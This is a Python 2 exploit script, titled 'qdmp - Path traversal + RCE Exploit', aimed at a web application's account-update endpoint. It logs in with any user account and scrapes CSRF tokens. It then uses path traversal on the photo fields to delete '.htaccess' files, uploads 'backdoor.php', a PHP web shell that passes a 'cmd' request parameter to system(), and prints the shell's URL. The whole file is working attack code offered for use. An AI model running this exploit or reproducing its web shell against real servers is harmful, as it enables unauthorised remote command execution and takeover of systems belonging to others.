import requests
from lxml import html
from argparse import ArgumentParser

session_requests = requests.session()

def multifrm(
    userid,
    username,
    csrftoken_,
    EMAIL,
    HOSTNAME,
    uservar,
    ):
    request_1 = {
        'sf_method': (None, 'put'),
        'users[id]': (None, userid[-1]),
        'users[photo_preview]': (None, uservar),
        'users[_csrf_token]': (None, csrftoken_[-1]),
        'users[name]': (None, username[-1]),
        'users[new_password]': (None, ''),
        'users[email]': (None, EMAIL),
        'extra_fields[9]': (None, ''),
        'users[remove_photo]': (None, '1'),
        }
    return request_1


def req(
    userid,
    username,
    csrftoken_,
    EMAIL,
    HOSTNAME,
    ):
    request_1 = multifrm(
        userid,
        username,
        csrftoken_,
        EMAIL,
        HOSTNAME,
        '.htaccess',
        )
    new = session_requests.post(HOSTNAME + 'index.php/myAccount/update'
                                , files=request_1)
    request_2 = multifrm(
        userid,
        username,
        csrftoken_,
        EMAIL,
        HOSTNAME,
        '../.htaccess',
        )
    new1 = session_requests.post(HOSTNAME + 'index.php/myAccount/update'
                                 , files=request_2)
    request_3 = {
        'sf_method': (None, 'put'),
        'users[id]': (None, userid[-1]),
        'users[photo_preview]': (None, ''),
        'users[_csrf_token]': (None, csrftoken_[-1]),
        'users[name]': (None, username[-1]),
        'users[new_password]': (None, ''),
        'users[email]': (None, EMAIL),
        'extra_fields[9]': (None, ''),
        'users[photo]': ('backdoor.php',
                         '<?php if(isset($_REQUEST[\'cmd\'])){ echo "<pre>"; $cmd = ($_REQUEST[\'cmd\']); system($cmd); echo "</pre>"; die; }?>'
                         , 'application/octet-stream'),
        }
    upload_req = session_requests.post(HOSTNAME
            + 'index.php/myAccount/update', files=request_3)


def main(HOSTNAME, EMAIL, PASSWORD):
    result = session_requests.get(HOSTNAME + '/index.php/login')
    login_tree = html.fromstring(result.text)
    authenticity_token = \
        list(set(login_tree.xpath("//input[@name='login[_csrf_token]']/@value"
             )))[0]
    payload = {'login[email]': EMAIL, 'login[password]': PASSWORD,
               'login[_csrf_token]': authenticity_token}
    result = session_requests.post(HOSTNAME + '/index.php/login',
                                   data=payload,
                                   headers=dict(referer=HOSTNAME
                                   + '/index.php/login'))
    account_page = session_requests.get(HOSTNAME + 'index.php/myAccount'
            )
    account_tree = html.fromstring(account_page.content)
    userid = account_tree.xpath("//input[@name='users[id]']/@value")
    username = account_tree.xpath("//input[@name='users[name]']/@value")
    csrftoken_ = \
        account_tree.xpath("//input[@name='users[_csrf_token]']/@value")
    req(userid, username, csrftoken_, EMAIL, HOSTNAME)
    get_file = session_requests.get(HOSTNAME + 'index.php/myAccount')
    final_tree = html.fromstring(get_file.content)
    backdoor = \
        final_tree.xpath("//input[@name='users[photo_preview]']/@value")
    print 'Backdoor uploaded at - > ' + HOSTNAME + '/uploads/users/' \
        + backdoor[-1] + '?cmd=whoami'


if __name__ == '__main__':
    parser = \
        ArgumentParser(description='qdmp - Path traversal + RCE Exploit'
                       )
    parser.add_argument('-url', '--host', dest='hostname',
                        help='Project URL')
    parser.add_argument('-u', '--email', dest='email',
                        help='User email (Any privilege account)')
    parser.add_argument('-p', '--password', dest='password',
                        help='User password')
    args = parser.parse_args()

    main(args.hostname, args.email, args.password)
